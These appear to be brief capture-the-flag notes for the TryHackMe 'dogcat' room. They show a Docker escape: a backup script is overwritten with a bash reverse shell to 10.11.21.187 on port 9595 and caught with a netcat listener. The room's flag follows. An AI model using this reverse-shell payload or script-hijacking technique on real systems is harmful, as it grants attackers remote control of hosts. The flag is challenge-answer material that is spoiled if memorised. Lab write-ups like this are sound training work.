# Reverse shell in Docker 
## In dogcat shell
cd /opt/backups
echo "#!/bin/bash" > backup.sh
echo "/bin/bash -c 'bash -i >& /dev/tcp/10.11.21.187/9595 0>&1'" >> backup.sh
## In Kali
nc -nvlp 9595

# Flag
``THM{esc4l4tions_on_esc4l4tions_on_esc4l4tions_7a52b17dba6ebb0dc38bc1049bcba02d}``